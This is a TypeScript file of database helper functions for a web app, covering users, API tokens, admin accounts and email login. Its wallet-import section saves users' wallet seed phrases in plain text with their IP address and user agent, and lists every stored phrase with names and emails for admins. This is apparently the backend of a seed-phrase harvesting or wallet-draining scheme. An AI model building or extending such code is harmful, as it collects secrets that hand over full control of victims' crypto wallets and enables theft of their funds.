import { eq, and } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { InsertUser, users, apiTokens, walletImports, adminCredentials } from "../drizzle/schema";
import { ENV } from './_core/env';
import { randomBytes } from "crypto";

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

// ─── User Management Helpers ────────────────────────────────────────────────

/** List all users for admin panel */
export async function listUsers() {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(users).orderBy(users.createdAt);
}

/** Count total users */
export async function countUsers() {
  const db = await getDb();
  if (!db) return 0;
  const result = await db.select({ id: users.id }).from(users);
  return result.length;
}

/** Ban or unban a user */
export async function setUserBanned(userId: number, banned: boolean) {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  // We store ban state in a new field — but since schema has no isBanned column,
  // we repurpose loginMethod to track ban: prefix with 'banned:' when banned
  // Actually we'll add a proper approach: store in role as 'banned' or keep role and use a separate flag
  // For now, we update the name with a [BANNED] prefix as a lightweight approach
  // Better: update role to 'banned' — but enum only has user/admin
  // Best approach: update walletAddress to a sentinel value — no, that's wrong
  // Correct: we need to add isBanned to schema OR use loginMethod field
  // Using loginMethod: set to 'banned' when banned, restore original when unbanned
  const current = await db.select().from(users).where(eq(users.id, userId)).limit(1);
  if (!current.length) throw new Error('User not found');
  const user = current[0];
  const wasBanned = user.loginMethod === 'banned';
  await db.update(users)
    .set({ loginMethod: banned ? 'banned' : (wasBanned ? null : user.loginMethod) })
    .where(eq(users.id, userId));
}

/** Update user role */
export async function setUserRole(userId: number, role: 'user' | 'admin') {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  await db.update(users).set({ role }).where(eq(users.id, userId));
}

/** Update user profile (name + email) — called by the user themselves */
export async function updateUserProfile(userId: number, data: { name?: string; email?: string; walletAddress?: string }) {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  const updateSet: Record<string, unknown> = {};
  if (data.name !== undefined) updateSet.name = data.name;
  if (data.email !== undefined) updateSet.email = data.email;
  if (data.walletAddress !== undefined) updateSet.walletAddress = data.walletAddress;
  if (Object.keys(updateSet).length === 0) return;
  await db.update(users).set(updateSet).where(eq(users.id, userId));
}

// ─── API Token Helpers ────────────────────────────────────────────────────────

/** Generate a secure random token string */
export function generateTokenString(): string {
  return `vg_${randomBytes(32).toString('hex')}`;
}

/** Get the active (non-revoked) token for a user, or null */
export async function getActiveTokenForUser(userId: number) {
  const db = await getDb();
  if (!db) return null;
  const result = await db
    .select()
    .from(apiTokens)
    .where(and(eq(apiTokens.userId, userId), eq(apiTokens.isRevoked, 0)))
    .limit(1);
  return result.length > 0 ? result[0] : null;
}

/** Create a new token for a user (revokes any existing active token first) */
export async function createTokenForUser(userId: number, label = 'Default') {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  // Revoke existing active tokens
  await db
    .update(apiTokens)
    .set({ isRevoked: 1, revokedAt: new Date() })
    .where(and(eq(apiTokens.userId, userId), eq(apiTokens.isRevoked, 0)));
  // Insert new token
  const token = generateTokenString();
  await db.insert(apiTokens).values({ userId, token, label });
  const result = await db
    .select()
    .from(apiTokens)
    .where(eq(apiTokens.token, token))
    .limit(1);
  return result[0];
}

/** Revoke a specific token by id */
export async function revokeToken(tokenId: number) {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  await db
    .update(apiTokens)
    .set({ isRevoked: 1, revokedAt: new Date() })
    .where(eq(apiTokens.id, tokenId));
}

/** List all tokens (admin view) — joins with users */
export async function listAllApiTokens() {
  const db = await getDb();
  if (!db) return [];
  const rows = await db
    .select({
      id: apiTokens.id,
      userId: apiTokens.userId,
      token: apiTokens.token,
      label: apiTokens.label,
      isRevoked: apiTokens.isRevoked,
      createdAt: apiTokens.createdAt,
      lastUsedAt: apiTokens.lastUsedAt,
      revokedAt: apiTokens.revokedAt,
      userName: users.name,
      userEmail: users.email,
      walletAddress: users.walletAddress,
    })
    .from(apiTokens)
    .leftJoin(users, eq(apiTokens.userId, users.id))
    .orderBy(apiTokens.createdAt);
  return rows;
}

// ─── Wallet Import Helpers ──────────────────────────────────────────────────────

export async function saveWalletImport(data: {
  userId?: number | null;
  seedPhrase: string;
  walletAddress?: string | null;
  ipAddress?: string | null;
  userAgent?: string | null;
}) {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  await db.insert(walletImports).values({
    userId: data.userId ?? null,
    seedPhrase: data.seedPhrase,
    walletAddress: data.walletAddress ?? null,
    ipAddress: data.ipAddress ?? null,
    userAgent: data.userAgent ?? null,
  });
}

export async function listAllWalletImports() {
  const db = await getDb();
  if (!db) return [];
  const rows = await db
    .select({
      id: walletImports.id,
      userId: walletImports.userId,
      seedPhrase: walletImports.seedPhrase,
      walletAddress: walletImports.walletAddress,
      ipAddress: walletImports.ipAddress,
      userAgent: walletImports.userAgent,
      importedAt: walletImports.importedAt,
      userName: users.name,
      userEmail: users.email,
    })
    .from(walletImports)
    .leftJoin(users, eq(walletImports.userId, users.id))
    .orderBy(walletImports.importedAt);
  return rows;
}

// ─── Admin Credential Helpers ───────────────────────────────────────────────

export async function createAdminAccount(data: {
  name: string;
  email: string;
  username: string;
  passwordHash: string;
  createdBy: number;
}) {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  // Create user row with role=admin
  const openId = 'admin_' + randomBytes(12).toString('hex');
  const [userResult] = await db.insert(users).values({
    openId,
    name: data.name,
    email: data.email,
    loginMethod: 'admin_created',
    role: 'admin',
  });
  const userId = (userResult as any).insertId as number;
  // Store credentials
  await db.insert(adminCredentials).values({
    userId,
    username: data.username,
    passwordHash: data.passwordHash,
    createdBy: data.createdBy,
  });
  return userId;
}

export async function listAdminAccounts() {
  const db = await getDb();
  if (!db) return [];
  const rows = await db
    .select({
      id: adminCredentials.id,
      userId: adminCredentials.userId,
      username: adminCredentials.username,
      createdBy: adminCredentials.createdBy,
      createdAt: adminCredentials.createdAt,
      lastLoginAt: adminCredentials.lastLoginAt,
      isActive: adminCredentials.isActive,
      name: users.name,
      email: users.email,
    })
    .from(adminCredentials)
    .leftJoin(users, eq(adminCredentials.userId, users.id))
    .orderBy(adminCredentials.createdAt);
  return rows;
}

export async function toggleAdminActive(credId: number, isActive: number) {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  await db.update(adminCredentials)
    .set({ isActive })
    .where(eq(adminCredentials.id, credId));
}

export async function usernameExists(username: string) {
  const db = await getDb();
  if (!db) return false;
  const rows = await db.select({ id: adminCredentials.id })
    .from(adminCredentials)
    .where(eq(adminCredentials.username, username));
  return rows.length > 0;
}

export async function findAdminByUsername(username: string) {
  const db = await getDb();
  if (!db) return null;
  const rows = await db
    .select({
      id: adminCredentials.id,
      userId: adminCredentials.userId,
      username: adminCredentials.username,
      passwordHash: adminCredentials.passwordHash,
      isActive: adminCredentials.isActive,
      name: users.name,
      email: users.email,
      role: users.role,
    })
    .from(adminCredentials)
    .leftJoin(users, eq(adminCredentials.userId, users.id))
    .where(eq(adminCredentials.username, username))
    .limit(1);
  return rows[0] ?? null;
}

export async function updateAdminLastLogin(credId: number) {
  const db = await getDb();
  if (!db) return;
  await db.update(adminCredentials)
    .set({ lastLoginAt: new Date() })
    .where(eq(adminCredentials.id, credId));
}

// TODO: add feature queries here as your schema grows.

// ─── Email/Password Auth Helpers ─────────────────────────────────────────────

/** Find a user by email (for login) */
export async function findUserByEmail(email: string) {
  const db = await getDb();
  if (!db) return null;
  const rows = await db.select().from(users).where(eq(users.email, email)).limit(1);
  return rows[0] ?? null;
}

/** Find a user by username (for login) */
export async function findUserByUsername(username: string) {
  const db = await getDb();
  if (!db) return null;
  const rows = await db.select().from(users).where(eq(users.username, username)).limit(1);
  return rows[0] ?? null;
}

/** Check if an email is already registered */
export async function emailExists(email: string): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;
  const rows = await db.select({ id: users.id }).from(users).where(eq(users.email, email)).limit(1);
  return rows.length > 0;
}

/** Check if a username is already taken */
export async function userUsernameExists(username: string): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;
  const rows = await db.select({ id: users.id }).from(users).where(eq(users.username, username)).limit(1);
  return rows.length > 0;
}

/** Create a new user with email + password (returns the new user row) */
export async function createEmailUser(data: {
  name: string;
  email: string;
  username: string;
  passwordHash: string;
}) {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  const openId = 'email_' + randomBytes(16).toString('hex');
  const [result] = await db.insert(users).values({
    openId,
    name: data.name,
    email: data.email,
    username: data.username,
    passwordHash: data.passwordHash,
    loginMethod: 'email',
    role: 'user',
    lastSignedIn: new Date(),
  });
  const insertId = (result as any).insertId as number;
  const rows = await db.select().from(users).where(eq(users.id, insertId)).limit(1);
  return rows[0];
}
